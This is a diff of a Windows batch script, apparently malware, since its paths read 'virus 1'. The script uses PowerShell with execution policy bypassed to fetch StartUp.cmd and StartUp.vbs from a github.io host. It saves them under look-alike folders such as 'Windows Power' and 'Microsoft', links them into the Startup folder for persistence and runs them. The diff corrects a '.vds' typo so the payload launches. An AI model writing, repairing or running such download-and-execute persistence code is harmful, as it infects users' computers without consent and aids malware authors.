@@ -33,17 +33,17 @@
 @echo off
 cd C:\Program Files\Windows Power\Windows Power\virus 1\file\files\
 powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://urobot2011.github.io/cmd/virus 1/file/files/StartUp.cmd', 'C:\Program Files\Windows Power\Windows Power\virus 1\file\files\StartUp.cmd');
-powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://urobot2011.github.io/cmd/virus 1/file/files/StartUp.vbs', 'C:\Program Files\Windows Power\Windows Power\virus 1\file\files\StartUp.vds');
+powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://urobot2011.github.io/cmd/virus 1/file/files/StartUp.vbs', 'C:\Program Files\Windows Power\Windows Power\virus 1\file\files\StartUp.vbs');
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
-MKLINK /D StartUp C:\Program Files\Windows Power\Windows Power\virus 1\file\files\StartUp.vds
+MKLINK /D StartUp C:\Program Files\Windows Power\Windows Power\virus 1\file\files\StartUp.vbs
 cd C:\Program Files\Windows Power\Windows Power\virus 1\file\files\
-start StartUp.vds
+start StartUp.vbs
 
 cd C:\Program Files\Microsoft
 powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://urobot2011.github.io/cmd/virus 1/file/files/StartUp.cmd', 'C:\Program Files\Microsoft\StartUp.cmd');
-powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://urobot2011.github.io/cmd/virus 1/file/files/StartUp.vbs', 'C:\Program Files\Microsoft\StartUp.vds');
+powershell.exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System.Net.WebClient).DownloadFile('https://urobot2011.github.io/cmd/virus 1/file/files/StartUp.vbs', 'C:\Program Files\Microsoft\StartUp.vbs');
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\
-MKLINK /D StartUp C:\Program Files\Microsoft\StartUp.vds
+MKLINK /D StartUp C:\Program Files\Microsoft\StartUp.vbs
 cd C:\Program Files\Microsoft\
 start StartUp.vds
 cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\
